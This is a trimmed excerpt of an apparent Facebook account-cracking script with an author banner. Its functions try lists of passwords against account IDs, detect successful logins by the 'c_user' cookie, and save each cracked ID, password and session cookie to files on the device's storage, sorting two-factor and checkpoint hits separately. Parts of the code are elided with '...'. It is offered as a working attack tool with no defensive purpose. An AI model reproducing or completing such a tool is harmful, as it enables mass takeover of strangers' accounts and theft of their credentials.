...
def logo():
    os.system("clear")
    print(f"""\x1b[1;97m{W}
  .d8b.  d8888b. d888888b db    db  .d8b.  d8b   db 
 d8' `8b 88  `8D   `88'   `8b  d8' d8' `8b 888o  88 
 88ooo88 88oobY'    88     `8bd8'  88ooo88 88V8o 88 
 88~~~88 88`8b      88       88    88~~~88 88 V8o88 
 88   88 88 `88.   .88.      88    88   88 88  V888 
 YP   YP 88   YD Y888888P    YP    YP   YP VP   V8P 
\t   \033[31;42mARIYAN SABBIR\33[0;m\__ðŸ˜˜ðŸ˜ˆ
{40*"="} \x1b[1;97m
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : ARIYAN SABBIR
  [\x1b[1;95m+\x1b[1;97m] GITHUB : HHH292        
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : HHH2.0 
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : HHH2.1                       
...
def normalfl(id,psd,name,tid):
	...
	for pxw in psd:
		...
		if 'c_user' in logx:
			...
			print(f'\r\r{G}[ARIYAN-OK] {id} | {psw}{W}')
			ok.append(id)
			if 'y' in cokix:
				print(f'\r  {BG}[{W}Cookie{BG}]{E} : {G}{kuki}{W}');print(f"{W}{40*'-'}{E}")
			open('/sdcard/ARIYAN-FILE-OK.txt', 'a').write(id+' | '+psw+'  ------------>>>'+coki+"\n")
			break
		elif twfx in str(logx):
			print(f'\r\r{S}[ARIYAN-2F] {id} | {psw}{W}')
			open('/sdcard/ARIYAN-FILE-2F.txt', 'a').write(id+' | '+psw+"\n")
			twf.append(id)
			break
			...
			open('/sdcard/ARIYAN-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
	lop+=1
...
def graphfl2(id,psd,name,tid):
	...
	for pxw in psd:
		...
		if 'Please Confirm Email' in logx:
			...
			if 'y' in cpx:
				print(f'\r\r{R}[ARIYAN-CP] {id} | {psw}{W}');print(ua)
			open('/sdcard/ARIYAN-FILE-CP.txt', 'a').write(id+' | '+psw+"\n")
			cp.append(id)
			break
		else:continue
